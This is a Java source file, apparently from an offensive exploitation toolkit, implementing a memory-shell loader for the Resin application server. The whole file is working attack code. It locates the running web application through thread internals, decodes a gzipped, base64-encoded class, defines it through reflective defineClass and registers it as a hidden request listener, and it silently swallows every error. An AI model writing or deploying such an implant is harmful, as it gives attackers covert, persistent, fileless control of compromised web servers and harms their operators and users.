package com.ppp.middleware.loader;

import com.ppp.annotation.JavaClassModifiable;
import com.ppp.annotation.JavaClassType;
import com.ppp.annotation.MemShell;
import com.ppp.annotation.Middleware;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.ArrayList;
import java.util.zip.GZIPInputStream;

/**
 * @author Whoopsunix
 * <p>
 */
@Middleware(Middleware.Resin)
@MemShell(MemShell.Listener)
@JavaClassType(JavaClassType.Default)
@JavaClassModifiable({JavaClassModifiable.CLASSNAME})
public class ResinListenerThreadLoader {
    private static String gzipObject;
    private static String CLASSNAME;

    public ResinListenerThreadLoader() {
        try {
            inject();
        } catch (Throwable e) {

        }
    }

    /**
     * Resin Listener
     */
    public static void inject() throws Exception {
        Thread[] threads = (Thread[]) getFieldValue(Thread.currentThread().getThreadGroup(), "threads");

        for (int i = 0; i < threads.length; i++) {
            try {
                Class cls = threads[i].currentThread().getContextClassLoader().loadClass("com.caucho.server.dispatch.ServletInvocation");
                Object contextRequest = cls.getMethod("getContextRequest").invoke(null);
                Object webapp = contextRequest.getClass().getMethod("getWebApp").invoke(contextRequest);
                if (webapp == null) {
                    continue;
                }

                try {
                    ArrayList _requestListeners = (ArrayList) getFieldValue(webapp, "_requestListeners");
                    for (int j = 0; j < _requestListeners.size(); j++) {
                        if (_requestListeners.get(j) instanceof Proxy) {
                            if (getFieldValue(_requestListeners.get(j), "h").getClass().getName().equals(CLASSNAME)) {
                                return;
                            }
                        }
                    }
                } catch (Exception e) {

                }

                // 动态代理兼容 javax jakarta
                Class listenerClass = null;
                try {
                    listenerClass = Class.forName("jakarta.servlet.ServletRequestListener");
                } catch (Exception e) {
                    try {
                        listenerClass = Class.forName("javax.servlet.ServletRequestListener");
                    } catch (ClassNotFoundException ex) {

                    }
                }

                byte[] bytes = decompress(gzipObject);
                ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
                Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                defineClass.setAccessible(true);
                Class clazz;
                try {
                    clazz = (Class) defineClass.invoke(classLoader, bytes, 0, bytes.length);
                } catch (Exception e) {
                    clazz = classLoader.loadClass(CLASSNAME);
                }

                Object javaObject = clazz.newInstance();
                Object object = Proxy.newProxyInstance(listenerClass.getClassLoader(), new Class[]{listenerClass}, (InvocationHandler) javaObject);
                invokeMethod(webapp.getClass(), webapp, "addListenerObject", new Class[]{Object.class, Boolean.TYPE}, new Object[]{object, true});
                invokeMethod(webapp.getClass(), webapp, "clearCache", new Class[]{}, new Object[]{});
                return;
            } catch (Exception e) {

            }
        }
    }

    // tools
    public static byte[] decompress(String gzipObject) throws Exception {
        ByteArrayInputStream bais = new ByteArrayInputStream(base64(gzipObject));
        try {
            GZIPInputStream gzipInputStream = new GZIPInputStream(bais);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buffer = new byte[1024];
            int len;
            while ((len = gzipInputStream.read(buffer)) > 0) {
                baos.write(buffer, 0, len);
            }
            return baos.toByteArray();
        } catch (Exception e) {

        }
        return null;
    }

    public static byte[] base64(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) invokeMethod(clazz.getSuperclass(), clazz.newInstance(), "decodeBuffer", new Class[]{String.class}, new Object[]{str});
        } catch (Exception var5) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = invokeMethod(clazz, null, "getDecoder", new Class[]{}, new Object[]{});
            return (byte[]) invokeMethod(decoder.getClass(), decoder, "decode", new Class[]{String.class}, new Object[]{str});
        }
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static Object invokeMethod(Class cls, Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
        Method method = cls.getDeclaredMethod(methodName, argsClass);
        method.setAccessible(true);
        Object object = method.invoke(obj, args);
        return object;
    }


}
